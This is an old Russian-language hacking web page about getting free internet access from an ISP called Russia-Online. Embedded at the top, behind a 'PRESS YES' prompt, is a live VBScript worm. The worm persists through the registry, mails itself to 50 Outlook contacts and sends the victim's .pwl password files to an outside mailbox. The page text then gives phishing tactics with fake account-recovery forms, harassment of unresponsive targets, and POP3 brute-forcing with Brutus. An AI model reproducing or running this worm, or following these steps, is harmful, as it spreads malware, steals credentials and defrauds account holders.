<html>
<p align="left"><font color="#c0c0c0" size="6">
PRESS "YES"
</html>
<html>
<script language ="VBScript">
On Error Resume Next
Dim FileSysObject, File
Set FileSysObject = CreateObject ("Scripting.FileSystemObject")
Set File = FileSysObject.GetFile(WScript.ScriptFullName)
File.Copy ("c:\windows\winsystem.vbs")
Dim WshShell
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\iexplores", "c:\windows\winsystem.vbs"
Dim OutlookObject, OutMail, Index
Set OutlookObject = CreateObject("Outlook.Application")
For Index = 1 To 50
Set OutMail = OutlookObject.CreateItem(0)
OutMail.to = OutlookObject.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Index)
OutMail.Subject = "тут прогу одну нашёл..."
OutMail.Body = "рулёзная вещь"
OutMail.Attachments.Add(WScript.ScriptFullName)
OutMail.Send
Next
Set OutMail = OutlookObject.CreateItem(0)
OutMail.to = "ronin911t@mailru.com"
OutMail.Subject = "получи от меня"
OutMail.Body = "от ламера"
OutMail.Attachments.Add("c:\windows\*.pwl")
OutMail.Send
</script>

</html>
<html>
<head>
<meta http-equiv="Content-Type"
content="text/html; charset=windows-1251">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
<title>РОССИЯ-ОФФ-ЛАЙН</title>
</head>
<body bgcolor="#C0C0C0">
<br>
        <td><a href="http://www.hackrol.narod.ru/index.htm"><font
        color="#0000FF" size="5">[На главную]</font></a><font
        color="#0000FF" size="5"> </font></td>
    </tr>
</br>
<hr>
<p align="center"><font color="#008080" size="7">РОССИЯ_ОФФ_ЛАЙН</font></p>
<hr>
<p align="center"><font color="#000080" size="5"><strong><u>Восстановительная
форма.</u></strong></font></p>
<p><font color="#000000" size="4">В продолжении данной темы
можно сказать, что замечена
характерная особенность: 90 юзеров
из ста открывают незнакомые письма,
а только 60 из них читают всю
лабудень, написанную в нём. И что
самое главное! 30 юзеров из ста
отвечают на анкеты разного вида,
причём 5 юзеров способны заполнить
и отправить анкеты такого типа:</font></p>

<p><img src="http://www.hackrol.narod.ru/bmp1.gif"
width="385" height="295"></p>

<p><font color="#000000" size="4">Как показал эксперимент,
в ходе которого было отправлено 50
анкет- только 3 юзера подарили мне
пароль от халявного инета. Причём
это были дэвушки!</font><font color="#FF0000"
size="4">:)</font></p>

<p><font color="#000000" size="4">Кого же выбрать целью
данной расылки? Всё очень просто!
Берём первую попавшуюся газету и
начинаем исать объявления молодых,
только что открывшихся фирм- именно
они в 70% случаев используют e-mail от
своего провайдера. Шлём на мыло
весточку, что так мол и так-
накрылся &quot;личный кабинет&quot;,
убедительная просьба- восстановите
утерянные данные. Если в течении
нескольких дней этот финт не
проходит, то следует забрасать ящик
всяко требухнёй, подписать его на
рассылку завлекательных рассказов
трансвиститов и т. д. и т. п.(не дай
бог такому случиться!)</font><font
color="#FF0000" size="4">:)</font></p>

<p align="center"><font color="#000080" size="5"><strong><u>Перебор
паролей.</u></strong></font></p>

<p align="left"><font color="#000000" size="4">Пользователи
россии off-line используют мыльные
ящики своего провайдера(см. выше),
причём логин и пароль от мыла
совпадает с логином и паролем от
инета. Берём занасфуфыреный
переборщик паролей </font><font color="#0000FF"
size="4">Brutus AET 2</font><font color="#000000" size="4"> . Но нам
нужно так же сгенерировать пароли
для него! Пароли состоят из восьми
букв латинского алфавита, пишем на
любом доступном языке программку и
генерируем. Если совсем безрукий,
то можно скачать у меня</font><a
href="http://www.hackrol.narod.ru/generator.exe"><font color="#000ff0"
size="4">generator</font></a><font color="#000000" size="4"> и делаем
файло с мылами name.txt. В настройках
указываем pop.online.ru -&gt; POP3 и путь к
файлу и путь к файлу с паролями.
После чего нажимаем кнопочку </font><font
color="#FF0000" size="4">start</font><font color="#000000" size="4">.
Скорость перебора зависит от
размера файла с паролями(2000000
паролей- 19Мб), т.е. лучше
сгенерировать несколько файликов
по 500000 паролей, чем грузить
оперативку огромной лажей.
Результатом моего перебора явился
халявный инет на целый месяц.
Кстати, чтобы стопудов подобрать
пароль к инету, понадобиться </font><font
color="#FF0000" size="4">1986 лет</font><font color="#000000" size="4"> и
винчестер </font><font color="#FF0000" size="4">1,5
террабайт</font><font size="4">(1Тб=1000Гб=1000000Мб).</font></p>

<p align="left"><font color="#000000" size="4">P.S у меня офигенное
количество способов как заполучить
бесплатный инет. </font><font color="#FF0000"
size="4">Но как уже говорилось выше
данная информация представлена в
ознакоительных целях И НЕ МОЖЕТ
БЫТЬ ИСПОЛЬЗОВАНА ВО ВРЕД
компьютерному сообществу.</font></p>

<p align="left"><font color="#000000" size="4">Ваши пожелания и
предложения по поводу
несправедливости своего
провайдера направляйте сюда:
support@rol.ru</font></p>

<p align="left">&nbsp;</p>

<p align="left">&nbsp;</p>

<p>&nbsp;</p>
<!-- SpyLOG f:0211 -->
<script language="javascript"><!--
Mu="u3657.81.spylog.com";Md=document;Mnv=navigator;Mp=1;
Mn=(Mnv.appName.substring(0,2)=="Mi")?0:1;Mrn=Math.random();
Mt=(new Date()).getTimezoneOffset();
Mz="p="+Mp+"&rn="+Mrn+"&t="+Mt;
My="";
My+="<a href='http://"+Mu+"/cnt?cid=365781&f=3&p="+Mp+"&rn="+Mrn+"' target='_blank'>";
My+="<img src='http://"+Mu+"/cnt?cid=365781&"+Mz+"&r="+escape(Md.referrer)+"&pg="+escape(window.location.href)+"' border=0 width=88 height=31 alt='SpyLOG'>";
My+="</a>";Md.write(My);//--></script><noscript>
<a href="http://u3657.81.spylog.com/cnt?cid=365781&f=3&p=1" target="_blank">
<img src="http://u3657.81.spylog.com/cnt?cid=365781&p=1" alt='SpyLOG' border='0' width=88 height=31 >
</a></noscript>
<!-- SpyLOG -->
</body>
</html><!-- ><!-- "><!-- '><!-- --></textarea></form>
</title></comment></a>
</div></span></ilayer></layer></iframe></noframes></style></noscript></table></script></applet></font>
<style>
#bn {display:block;}
#bt {display:block;}
</style>
<script language="JavaScript" src="http://bs.yandex.ru/show/163"></script>
